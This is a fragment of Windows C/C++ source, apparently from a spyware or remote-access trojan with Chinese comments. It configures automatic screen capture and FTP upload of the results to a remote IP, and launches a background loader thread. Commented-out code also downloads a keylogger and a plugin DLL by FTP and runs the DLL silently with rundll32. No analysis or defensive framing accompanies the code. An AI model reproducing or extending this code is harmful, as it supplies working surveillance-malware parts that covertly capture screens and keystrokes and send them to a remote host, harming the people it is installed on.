		memcpy(&AutoConfig,(char*)lparam,sizeof(AUTOSREECNCONFIG));

		char DllPath[MAX_PATH];
		//	char DllPath_bak[MAX_PATH];
		GetTempPathA(MAX_PATH,DllPath);

		strcat(DllPath,AutoConfig.szPlugName);
		//strcpy(DllPath_bak,)


		StopAutoScreen();

		HANDLE hEvent=CreateEvent(NULL, FALSE, FALSE, "dfsfa*&((");
		if (GetLastError()==ERROR_ALREADY_EXISTS)
		{
			WaitForSingleObject(hEvent,INFINITE);
		}


		pFTPCONFIG pFTPconfig=(pFTPCONFIG)GetShareMem("FTPCofigMemShare");
		if (pFTPconfig)
		{
			memcpy((char*)pFTPconfig,&AutoConfig.FtpConfig,sizeof(FTPCONFIG));
			StrCpyA(pFTPconfig->szUpIP,szIP);

// 			if (!dwFlag)
// 			{
// 				AutoConfig.FtpConfig.dwFtpProt=0;
// 			}


			if (!StrStr(GetCommandLineA(),"-mi"))
			{
				//if (IsExplorerParentProcess())
				{
					CloseHandle(CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)DriveLoad,&AutoConfig,0,NULL));
				}

			}

			//插件下载
			//CloseHandle(CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)PlugDownload,&AutoConfig,0,NULL)); //tsp2.0不需要
			//下载安装键盘记录
			//CloseHandle(CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)KeyBoardLoad,&AutoConfig,0,NULL));  //tsp2.0不需要

			Sleep(1000*5);

			

		//	if(_access(DllPath,0)==-1)   //yx 20140917 不去下载
		//	{
		////		DeleteFile(DllPath);
		//		FtpDownLoad(AutoConfig.szDownLoadPlugUrl,DllPath,AutoConfig.szPlugName,AutoConfig.szFtpUser,AutoConfig.szFtppass); 
		//		Sleep(1000);
		//	}
			
			/*  //tsp2.0不需要

			if(MyGetFileSize(DllPath)<1024*50){
				SetEvent(hEvent);
				CloseHandle(hEvent);
				DeleteFile(DllPath);
				return FALSE;
			}
			char szCmd[MAX_PATH];
			strcpy(szCmd,"rundll32 ");
			strcat(szCmd,DllPath);
			strcat(szCmd,",ServiceMain");
			WinExec(szCmd,0);

			*/
		}

		SetEvent(hEvent);
		CloseHandle(hEvent);
	}
	__except(1)
	{
		return 0;
	}

	return 0;
}



